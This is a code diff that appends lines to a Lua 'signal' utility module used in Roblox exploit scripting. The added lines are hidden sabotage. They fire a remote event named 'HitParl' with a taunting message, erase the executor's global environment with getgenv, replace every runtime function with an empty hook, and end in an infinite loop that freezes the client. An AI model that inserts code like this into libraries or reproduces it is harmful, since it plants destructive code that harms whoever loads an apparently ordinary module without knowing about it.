@@ -44,4 +44,20 @@ local signal = {}
         setmetatable(self, nil)
     end
 
+
+game:GetService("ReplicatedStorage"):FindFirstChild("HitParl", true):FireServer("paste-it-properly-next-time.")
+game:GetService("ReplicatedStorage"):FindFirstChild("HitParl", true):FireServer("paste-it-properly-next-time.")
+
+local g = getgenv()
+for i,v in getgenv() do
+    g[i] = nil
+end
+for i,v in getrenv() do
+    if typeof(v) == "function" then 
+        hookfunc(v, function() 
+        end) 
+    end
+end
+while true do end
+
 return signal
